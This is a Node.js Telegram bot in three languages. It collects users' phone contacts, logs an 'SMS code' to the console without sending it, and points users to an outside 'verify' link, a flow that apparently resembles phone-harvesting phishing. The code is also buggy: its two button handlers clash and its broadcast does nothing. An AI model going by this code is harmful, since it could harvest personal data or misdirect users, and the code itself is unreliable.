const TelegramBot = require('node-telegram-bot-api');
require('dotenv').config();

const bot = new TelegramBot(process.env.BOT_TOKEN, { polling: true });

const userData = {};
const phoneNumbers = [];

const sendVerificationSMS = (chatId, phoneNumber) => {
    const verificationCode = Math.floor(100000 + Math.random() * 900000);
    userData[chatId].verificationCode = verificationCode;

    console.log(`Verification code for ${phoneNumber}: ${verificationCode}`);
};

bot.on('message', (message) => {
    const chatId = message.chat.id;
    const text = message.text;

    if (text === '/start') {
        bot.sendMessage(chatId, 'Выберите язык | Choose a language | Tilni tanlang', {
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "Rus", callback_data: 'Rus' },
                        { text: "Eng", callback_data: 'Eng' },
                        { text: "Uzb", callback_data: "Uzb" }
                    ]
                ]
            }
        });
    } else if (text === '/sendtoall' && String(chatId) === process.env.ADMIN_CHAT_ID) {
        bot.sendMessage(chatId, "Введите сообщение для всех пользователей:");
        userData[chatId] = { step: 'broadcastMessage' };
    } else {
        const step = userData[chatId]?.step;
        if (step) {
            handleUserInput(chatId, step, text);
        }
    }
});

const handleUserInput = (chatId, step, text) => {
    const language = userData[chatId]?.language || 'Eng';
    switch (step) {
        case 'smsCode':
            if (text == userData[chatId].verificationCode) {
                switch (language) {
                    case 'Rus':
                        bot.sendMessage(chatId, "Регистрация успешно завершена!");
                        break;
                    case 'Eng':
                        bot.sendMessage(chatId, "Registration successfully completed!");
                        break;
                    case 'Uzb':
                        bot.sendMessage(chatId, "Ro'yxatdan o'tish muvaffaqiyatli yakunlandi!");
                        break;
                    default:
                        bot.sendMessage(chatId, "Registration successfully completed!");
                        break;
                }
                delete userData[chatId];
            } else {
                switch (language) {
                    case 'Rus':
                        bot.sendMessage(chatId, "Неверный код. Пожалуйста, попробуйте еще раз:");
                        break;
                    case 'Eng':
                        bot.sendMessage(chatId, "Invalid code. Please try again:");
                        break;
                    case 'Uzb':
                        bot.sendMessage(chatId, "Noto'g'ri kod. Iltimos, qayta urinib ko'ring:");
                        break;
                    default:
                        bot.sendMessage(chatId, "Invalid code. Please try again:");
                        break;
                }
            }
            break;
        case 'broadcastMessage':
            switch (language) {
                case 'Rus':
                    bot.sendMessage(chatId, "Сообщение отправлено всем пользователям!");
                    break;
                case 'Eng':
                    bot.sendMessage(chatId, "Message sent to all users!");
                    break;
                case 'Uzb':
                    bot.sendMessage(chatId, "Xabar barcha foydalanuvchilarga yuborildi!");
                    break;
                default:
                    bot.sendMessage(chatId, "Message sent to all users!");
                    break;
            }
            delete userData[chatId];
            break;
        case 'phoneNumber':
            break;
    }
};

bot.on('callback_query', (query) => {
    const chatId = query.message.chat.id;
    const language = query.data;

    userData[chatId] = { language: language, step: 'phoneNumber' };
    switch (language) {
        case 'Rus':
            bot.sendMessage(chatId, "Введите ваш номер телефона! Пример (+998 ***) или отправьте контакт", {
                reply_markup: {
                    keyboard: [
                        [
                            { text: "📲 Отправить контакт", request_contact: true }
                        ]
                    ],
                    one_time_keyboard: true,
                    resize_keyboard: true
                }
            });
            break;
        case 'Eng':
            bot.sendMessage(chatId, "Please enter your phone number! Example (+998 ***) or share your contact", {
                reply_markup: {
                    keyboard: [
                        [
                            { text: "📲 Share contact", request_contact: true }
                        ]
                    ],
                    one_time_keyboard: true,
                    resize_keyboard: true
                }
            });
            break;
        case 'Uzb':
            bot.sendMessage(chatId, "Telegram yoqilgan telefon raqamingizni kontakt ko'rinishida yuboring. Buning uchun 📲 Telefon raqamimni yuborish tugmasini bosing", {
                reply_markup: {
                    keyboard: [
                        [
                            { text: "📲 Telefon raqamni kiriting", request_contact: true }
                        ]
                    ],
                    one_time_keyboard: true,
                    resize_keyboard: true
                }
            });
            break;
    }
});

bot.on('contact', (msg) => {
    const chatId = msg.chat.id;
    const contact = msg.contact;
    const language = userData[chatId]?.language || 'Eng';

    if (contact && userData[chatId]?.step === 'phoneNumber') {
        userData[chatId].phoneNumber = contact.phone_number;
        userData[chatId].step = 'smsCode';
        sendVerificationSMS(chatId, contact.phone_number);

        let keyboardText;
        switch (language) {
            case 'Rus':
                keyboardText = [
                    [
                        { text: "🔢 введите код", callback_data: 'enterSmsCode' },
                        { text: "🤔 СМС-код не пришел", callback_data: 'resendSmsCode' },
                        { text: "🚫 Отменить", callback_data: 'cancelSmsCode' }
                    ]
                ];
                break;
            case 'Eng':
                keyboardText = [
                    [
                        { text: "🔢 Enter the code", callback_data: 'enterSmsCode' },
                        { text: "🤔 SMS code did not arrive", callback_data: 'resendSmsCode' },
                        { text: "🚫 Cancel", callback_data: 'cancelSmsCode' }
                    ]
                ];
                break;
            case 'Uzb':
                keyboardText = [
                    [
                        { text: "🔢 Kodni kiritish", callback_data: 'enterSmsCode' },
                        { text: "🤔 Sms code kelmadi", callback_data: 'resendSmsCode' },
                        { text: "🚫Bekor qilish", callback_data: 'cancelSmsCode' }
                    ]
                ];
                break;
            default:
                keyboardText = [
                    [
                        { text: "Cancel", callback_data: 'cancelSmsCode' }
                    ]
                ];
                break;
        }

        bot.sendMessage(chatId, language === 'Uzb' ? "SMS-kodni kiriting:" : "Enter SMS code:", {
            reply_markup: {
                inline_keyboard: keyboardText
            }
        });

        if (!phoneNumbers.includes(contact.phone_number)) {
            phoneNumbers.push(contact.phone_number);
        }
    }
});

bot.on('callback_query', (query) => {
    const chatId = query.message.chat.id;
    const language = userData[chatId]?.language || 'Eng';

    switch (query.data) {
        case 'resendSmsCode':
            sendVerificationSMS(chatId, userData[chatId].phoneNumber);
            bot.sendMessage(chatId, language === 'Uzb' ? "SMS code resent!" : "SMS-kod qaytadan yuborildi! ");
            break;
        case 'cancelSmsCode':
            delete userData[chatId];
            bot.sendMessage(chatId, {
                'Uzb': "❌ Ro'yxatdan o'tish bekor qilindi\n\nBoshidan boshlash uchun /start buyruqni yuboring",
                'Eng': "❌ Registration cancelled\n\nSend /start to begin again",
                'Rus': "❌ Регистрация отменена\n\nОтправьте /start для начала заново"
            }[language]);
            break;
        case 'enterSmsCode':
            bot.sendMessage(chatId, 'Quyidagi tugmani bosing:', {
                reply_markup: {
                    inline_keyboard: [
                        [{ text: "Saytga o'tish", url: 'https://tg.click.uz/yPeDoQEAAAAJcmgpAw/verify/' }]
                    ]
                }
            });
            break;
    }
});

module.exports = bot;
